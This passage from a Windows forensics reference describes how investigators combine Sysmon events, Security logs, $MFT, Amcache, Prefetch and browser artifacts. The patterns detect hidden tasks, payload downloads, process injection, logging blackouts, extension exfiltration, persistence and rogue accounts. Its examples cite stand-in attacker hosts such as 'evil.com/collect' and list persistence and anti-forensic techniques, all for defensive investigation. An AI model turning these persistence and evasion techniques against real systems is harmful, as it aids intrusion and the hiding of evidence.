- **Security 4698** — task creation event (if audit policy enabled).
- **Task Scheduler Operational 106 / 140** — task registered / updated.
- **$MFT** on the XML file — creation time.
- **Subsequent execution** — Sysmon 1, Amcache, Prefetch of the Actions command.

**The corroborated story:** XML in `\Microsoft\Windows\WindowsMail\Drone.xml` exists (`$MFT` create 2026-05-15). No matching `Hash` in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\WindowsMail\Drone`. Security 4698 never fired. Operational 106 missing. Yet Operational 200 (action start) fires at the trigger time, and Sysmon 1 logs the spawned process. Anomaly: task runs but was never "registered" through canonical channels.

**Why this combination matters:** Hidden tasks are deliberately concealed. The XML-vs-registry-vs-events triad uncovers them.

**Where it fails:**
- Some legitimate Microsoft Update tasks are added by Windows Update directly via internal APIs; superficially similar.

---

### 34.13 Pattern: "Browser-cached payload retrieval"

**What it reveals:** An attacker used a victim browser to download a payload that subsequently executed — sometimes the original delivery is gone but the browser cache holds it.

**Constituent artifacts:**
- **Browser History** — URL visited with `transition_type` = TYPED or LINK.
- **Browser Downloads DB** — download record with target_path and source URL.
- **Zone.Identifier (§31)** on the downloaded file — HostUrl in modern format.
- **Browser cache** — copy of the downloaded resource indexed by URL hash.
- **$MFT** on the target path — file creation timestamp matches download end time.
- **Amcache + Prefetch** — confirm execution after download.
- **Sysmon 11** — file create event from the browser process.
- **Sysmon 22 / 3** — DNS and outbound connection by browser.

**The corroborated story:** Chrome `History.downloads` shows download from `http://evil/payload.exe` to `%TEMP%\payload.exe`, end_time = 14:30:22. Zone.Identifier on `payload.exe` carries `HostUrl=http://evil/payload.exe`. Cache holds the response. $MFT confirms file create at 14:30:22 by Chrome. Amcache records first-seen 14:30:22, unsigned. Prefetch generated at 14:30:45 (one run). Sysmon 1 logs spawn from `explorer.exe` (user double-clicked).

**Why this combination matters:** Even after the attacker takes down the delivery URL, the cached response is recoverable and the on-disk chain is preserved.

**Where it fails:**
- Incognito doesn't write History or cache.
- HTTPS payloads with no-cache headers don't get cached.

---

### 34.14 Pattern: "Process injection / hollowing"

**What it reveals:** A process's in-memory image differs from its on-disk image — code injection, hollowing, doppelganging, or herpaderping.

**Constituent artifacts:**
- **Sysmon 8** — CreateRemoteThread events; source process injecting into target.
- **Sysmon 10** — ProcessAccess with `GrantedAccess` indicating injection rights (PROCESS_VM_WRITE, PROCESS_CREATE_THREAD).
- **Sysmon 25** — Process tampering events (image differs from on-disk).
- **Sysmon 7** — Image loaded; comparing in-memory loaded image hash against on-disk hash.
- **Memory image (hiberfil §29 or live capture)** — Volatility plugins `malfind`, `hollowfind`, `ldrmodules`.
- **Sysmon 1 / 4688** — process creation of the injector.

**The corroborated story:** Sysmon 1 logs `injector.exe` start. Sysmon 10 from injector.exe to `notepad.exe` with `GrantedAccess=0x1F0FFF` (PROCESS_ALL_ACCESS). Sysmon 8 from injector to notepad with target thread. Sysmon 25 for notepad with tampering type "Process Herpaderping." Memory analysis confirms notepad's mapped image hash differs from on-disk notepad.exe.

**Why this combination matters:** Injection is invisible to most other artifact families. Sysmon 8/10/25 + memory are the canonical detection plane.

**Where it fails:**
- Without Sysmon, much of this is invisible.
- Modern protected processes (PPL) resist injection.
- Some legitimate software injects (debuggers, AV).

---

### 34.15 Pattern: "Time-window blackout — when nothing is logged"

**What it reveals:** A period during which Windows wasn't recording — either the EventLog service was stopped, audit policy was disabled, or logs were cleared. Often the most interesting window in an investigation.

**Constituent artifacts:**
- **System 7036** for EventLog service — stop/start times bracket the blackout.
- **Security 4719** — audit policy was changed (immediately before the blackout if attacker disabled categories).
- **System 6005 / 6006 / 6008** — boot/shutdown times; combine with the gap.
- **Sysmon ContinuesEvents** — if Sysmon was running and EventLog wasn't, Sysmon still logged.
- **$UsnJrnl** — filesystem activity continues regardless of EventLog state.
- **$MFT** — file creates during the blackout still appear.
- **Amcache / Prefetch** — execution that happened during the blackout still records into these caches once the service / cache catches up.
- **Registry last-write timestamps** during the blackout — persistence registrations still leave traces.

**The corroborated story:** EventLog stopped 02:00 (System 7036), restarted 04:00. Audit policy unchanged. $MFT shows three new files in `%ProgramData%` between 02:15 and 03:45. Amcache records them with SI first-seen 02:15-03:45. Sysmon (running independently) captured Sysmon 1 events showing what happened. Registry shows Run key added at 02:30 — recovered from VSS by diffing pre-02:00 hive vs current.

**Why this combination matters:** The absence of EventLog records during a window is itself a signal. Other artifacts that record in the background fill in the gap.

**Where it fails:**
- If Sysmon was also stopped and audit was disabled, only filesystem and registry artifacts remain.
- If the attacker is aware of $UsnJrnl and rotates it, even that may be gone.

---

### 34.16 Pattern: "Browser-extension exfil"

**What it reveals:** A malicious or compromised browser extension was installed and used to exfiltrate data.

**Constituent artifacts:**
- **Browser `Extensions\<ID>\` directory** — manifest.json, code, install timestamp.
- **Browser `Preferences` JSON** — extension install/enable state.
- **Browser History** — URLs the extension drove.
- **Sysmon 3** — outbound from browser to extension's C2.
- **Sysmon 22** — DNS to extension's C2 domain.
- **$MFT** on extension files — install time.
- **Chrome / Edge sync** — extension may have been auto-installed via sync from a different (compromised) host.

**The corroborated story:** Extension ID `abcdef...` installed 2026-05-15 (manifest.json create). manifest.json `permissions: ['<all_urls>', 'cookies', 'storage']` — overly broad. History shows browser making POST requests to `evil.com/collect`. Sysmon 22 / 3 confirm.

**Why this combination matters:** Browsers normally only contact resources the user navigates to. Background extension traffic visible in Sysmon and browser network logs is the smoking gun.

**Where it fails:**
- Some extensions encrypt traffic and tunnel through HTTPS; only DNS and connection metadata visible.
- Sync-installed extensions may appear without local-host install events.

---

### 34.17 Pattern: "Cross-corroboration timeline anchoring"

**What it reveals:** The general principle behind all the above — when multiple artifacts AGREE on a timestamp, the timestamp is reliable; when they DIVERGE, anti-forensics or system anomaly is suspected.

**The triangulation triad commonly used:**
- **$MFT SI vs FN** — disagreement suggests timestomp.
- **Prefetch first-run time vs Amcache first-seen time** — within minutes is normal; large gap means cache lag or tampering.
- **Sysmon 1 ProcessCreateTime vs Security 4688 SystemTime** — should match within seconds (same kernel event, different consumers).
- **Registry key last-write vs Sysmon 13 timestamp** — should match within seconds.
- **Event log generated time vs filesystem time on .evtx** — large divergence indicates log injection or clock skew.
- **NTP sync state** — if the system time was changed (System 1 / Security 4616), all earlier timestamps are suspect.

**The corroborated story for a SINGLE confirmed event:** Process creation of `evil.exe` at 14:03:11.
- Sysmon 1: UtcTime 14:03:11.482
- Security 4688: TimeGenerated 14:03:11.483
- $MFT SI Created on evil.exe: 14:03:10.231
- $MFT FN Created: 14:03:10.231 (matches SI — no timestomp)
- Amcache first-seen: 14:03:11.500
- Prefetch first-run: 14:03:11 (precision to second)
- $UsnJrnl REASON_FILE_CREATE for evil.exe: ~14:03:10
- $UsnJrnl REASON_DATA_OVERWRITE: ~14:03:10
- $UsnJrnl REASON_CLOSE: ~14:03:11

All artifacts agree to within sub-second precision. This is the gold standard.

**Where it fails:**
- System clock changes break this entire technique.
- Time zone confusion (UTC vs local) breaks correlation across artifacts that record in different conventions.
- Daylight savings transitions create one-hour windows where artifacts may disagree.

---

### 34.18 Pattern: "The five-second forensic loop"

**What it reveals:** The mental model many experienced examiners apply to any "did this binary execute" question: the same evidence rotates through five lenses.

**The five artifacts answering "did X.exe run?":**
1. **Prefetch** — was `X.EXE-<hash>.pf` created?
2. **Amcache** — does `InventoryApplicationFile` hold `X.exe` with SHA1?
3. **ShimCache** — does `AppCompatCache` mention `X.exe`?
4. **Event log** — is there a 4688 / Sysmon 1 with `NewProcessName=X.exe`?
5. **UserAssist** (per-user, shell-launched only) — was `X.exe` invoked via Explorer?

**Plus the "did it write a child / load a DLL / make a network call?" follow-ups via:**
- Sysmon 1 (child process)
- Sysmon 7 (DLL load)
- Sysmon 3 / 22 (network).

**Why this pattern matters:** It is the working triage loop. An examiner who finds zero of the five execution artifacts confidently asserts "did not run." Finding any one is suggestive; finding three is conclusive.

**Where it fails:**
- All five can be defeated by a sophisticated adversary (Sysmon not deployed; Defender 5012 disabling things; ShimCache mid-RAM-flush; user-mode rootkits hooking; etc.). The absence is therefore weaker than presence.

---

### 34.19 Pattern: "Persistence redundancy"

**What it reveals:** Mature attackers register MULTIPLE persistence mechanisms — Run key + service + scheduled task + WMI subscription — to survive partial cleanup. The pattern is to find ONE and then specifically hunt the others before declaring eradication.

**Constituent artifacts (the four families):**
- Registry persistence — §12.
- Service persistence — §13.
- Scheduled task persistence — §14.
- WMI subscription persistence — §15.

**Plus less-common:**
- COM hijack via registry CLSID rewrites.
- IFEO Debugger redirection.
- AppInit_DLLs.
- Print processor / port monitor.
- Office add-ins (WLL, XLL, OutlookAddin).
- LSA security packages (Notification Packages, Authentication Packages).
- Image Hijacks.

**The pattern in practice:** Once one persistence is found, the examiner must enumerate ALL ASEP families and check for additional implants. The same `evil.exe` may be invoked from a Run key (HKLM AND HKCU), a Service (with svchost ServiceDll), a Scheduled Task with LogonTrigger, AND a WMI ActiveScriptEventConsumer all simultaneously.

**Why this combination matters:** Removing the visible persistence and missing the redundant ones reinfects the system.

**Where it fails:**
- ASEP coverage of every Windows ASEP requires a tool like Autoruns. Manual enumeration misses categories.

---

### 34.20 Pattern: "Account creation + privilege addition"

**What it reveals:** Attacker created a new account or escalated an existing account into a privileged group.

**Constituent artifacts:**
- **Security 4720** — user account created.
- **Security 4732 / 4728 / 4756** — added to local/global/universal administrators group.
- **Security 4724** — password reset (often paired with backdooring existing accounts).
- **Security 4738** — user account changed.
- **Security 4672** — special privileges (admin-equivalent) on subsequent logon by the new account.
- **SAM hive** — local accounts (RIDs, F/V values).
- **NTDS.dit** for domain accounts.
- **Sysmon 1 / 4688** — `net user`, `net localgroup`, `Add-LocalGroupMember`, `New-ADUser` invocations.
- **PowerShell 4104** — script block content of the command.

**The corroborated story:** 4720 at 04:00 creates `helpdesk_svc`. 4732 at 04:00:05 adds `helpdesk_svc` to Administrators. PowerShell 4104 captures the `net user` + `net localgroup` invocations. Subsequent 4624 logons by `helpdesk_svc` show 4672.

**Why this combination matters:** Account creation is rare on most hosts. Combined with privilege addition and subsequent logon, the account is a backdoor.

**Where it fails:**
- Pre-existing service accounts being elevated rather than new accounts created — 4720 doesn't fire. 4732 alone with a stale account = suspicious.

---

### Closing principle: convergence over single-source

The encyclopedia entries describe what each artifact knows. The cross-artifact patterns describe how independent knowledge sources converge on the same conclusion. Mature investigation is not "what does Prefetch say?" — it is "what do Prefetch, Amcache, ShimCache, Security 4688, Sysmon 1, $MFT, and $UsnJrnl JOINTLY say about whether `evil.exe` ran at 14:03:11 on 2026-05-22?"

When they agree, the conclusion is robust. When they disagree, the disagreement IS the finding — pointing to time-skew, anti-forensics, hardware failure, or sub-second-precision artifacts misaligned. Either outcome — agreement or disagreement — is forensically useful.

Single-artifact findings are leads. Multi-artifact convergence is evidence.

---
